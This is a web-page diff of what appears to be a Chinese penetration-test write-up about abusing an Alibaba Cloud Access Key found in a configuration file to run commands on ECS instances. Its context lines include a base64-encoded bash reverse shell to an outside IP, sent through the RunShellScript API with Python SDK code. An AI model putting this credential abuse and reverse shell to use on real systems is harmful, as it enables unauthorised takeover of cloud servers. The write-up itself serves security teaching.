@@ -113,7 +113,7 @@
 <p>前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。</p>
 <p>在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。</p>
 <p>首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？</p>
-<pre><code>Access Key Id : *********
+<pre tabindex="0"><code>Access Key Id : *********
 Access Secret : ***************************
 Region : cn-*****
 </code></pre><p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p>
@@ -138,10 +138,10 @@ Region : cn-*****
 <li>RunShellScript：创建一个在 Linux 实例中运行的 Shell 脚本</li>
 </ul>
 <p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p>
-<pre><code>rvn0xsy@Rvn0xsy ~&gt; echo &quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1&quot; | base64
+<pre tabindex="0"><code>rvn0xsy@Rvn0xsy ~&gt; echo &quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1&quot; | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
 </code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64788dbca11e1dfd99c53caae568dccc.png" alt="2019-04-02-21-29-22"></p>
-<pre><code>#!/usr/bin/env python
+<pre tabindex="0"><code>#!/usr/bin/env python
 #coding=utf-8
 
 from aliyunsdkcore.client import AcsClient
@@ -163,12 +163,12 @@ response = client.do_action_with_exception(request)
 print(str(response, encoding='utf-8'))
 
 </code></pre><p>执行成功后，会返回如下信息：</p>
-<pre><code>{
+<pre tabindex="0"><code>{
 	&quot;RequestId&quot;: &quot;********-****-****-****-********&quot;,
 	&quot;CommandId&quot;: &quot;c-0************&quot;
 }
 </code></pre><p>CommandId最好记下来，不然还要调用<a href="https://api.aliyun.com/find/Ecs/DescribeCommands?spm=a2c1g.8271268.10000.91.169bdf25hVPFbi">DescribeCommands</a></p>
-<pre><code>{
+<pre tabindex="0"><code>{
 	&quot;PageNumber&quot;: 1,
 	&quot;TotalCount&quot;: 1,
 	&quot;PageSize&quot;: 10,
